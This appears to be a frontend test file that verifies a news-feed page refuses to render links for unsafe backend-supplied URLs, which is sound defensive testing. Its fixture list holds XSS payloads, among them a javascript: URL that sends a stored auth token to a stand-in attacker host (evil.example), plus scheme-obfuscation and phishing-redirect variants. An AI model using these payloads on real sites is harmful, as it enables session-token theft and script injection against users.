import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { render, screen, waitFor } from '@testing-library/react'
import ForYouPage from './page'

const POISONED_URLS = [
  "javascript:fetch('https://evil.example/?t='+localStorage.getItem('vccircle_auth_token'))",
  'JaVaScRiPt:alert(1)',
  'java\tscript:alert(1)',
  ' javascript:alert(1)',
  'data:text/html,<script>alert(1)</script>',
  '//evil/phish',
  '\\\\evil.com',
]

function mockFeed(urls: string[]) {
  vi.stubGlobal(
    'fetch',
    vi.fn(async (input: RequestInfo | URL) => {
      const url = String(input)
      // The shared top bar asks who the visitor is on mount. Answer signed
      // out, the same way the real backend answers a session-less cookie.
      if (url.includes('/api/auth/me')) {
        return { ok: false, status: 401, json: async () => null, text: async () => '' }
      }
      return {
        ok: true,
        json: async () => ({
          articles: urls.map((url, i) => ({
            id: 200 + i,
            title: `Deal ${i}`,
            url,
            summary: `Summary ${i}`,
          })),
        }),
      }
    })
  )
}

/**
 * Anchors inside the article grid. The page also renders the shared top bar,
 * which links to the other routes and to sign in; these tests are about
 * whether a backend-supplied article URL became clickable, so they look only
 * at the feed's own links.
 */
function feedLinks(container: HTMLElement): HTMLAnchorElement[] {
  const grid = container.querySelector('[class*="articles-grid"]')
  if (!grid) throw new Error('the article grid is not rendered')
  return Array.from(grid.querySelectorAll('a[href]'))
}

async function renderFeed(urls: string[]) {
  mockFeed(urls)
  const view = render(<ForYouPage />)
  await waitFor(() => expect(screen.getAllByText(/^Deal \d$/).length).toBeGreaterThan(0))
  return view
}

beforeEach(() => {
  vi.clearAllMocks()
})

afterEach(() => {
  vi.unstubAllGlobals()
})

describe('ForYouPage — unsafe backend URLs are not clickable', () => {
  it.each(POISONED_URLS)('renders no link for %j', async (url) => {
    const { container } = await renderFeed([url])

    expect(screen.getByText('Deal 0')).toBeTruthy()
    expect(feedLinks(container)).toHaveLength(0)
  })
})

describe('ForYouPage — safe URLs still link out', () => {
  it('renders a working link for an absolute https URL', async () => {
    const { container } = await renderFeed(['https://vccircle.com/news/deal-9'])

    const link = feedLinks(container)[0]
    expect(link?.getAttribute('href')).toBe('https://vccircle.com/news/deal-9')
    expect(link?.getAttribute('rel')).toBe('noopener noreferrer')
  })

  it('renders a working link for a same-origin relative path', async () => {
    const { container } = await renderFeed(['/articles/7'])

    expect(feedLinks(container)[0]?.getAttribute('href')).toBe('/articles/7')
  })
})
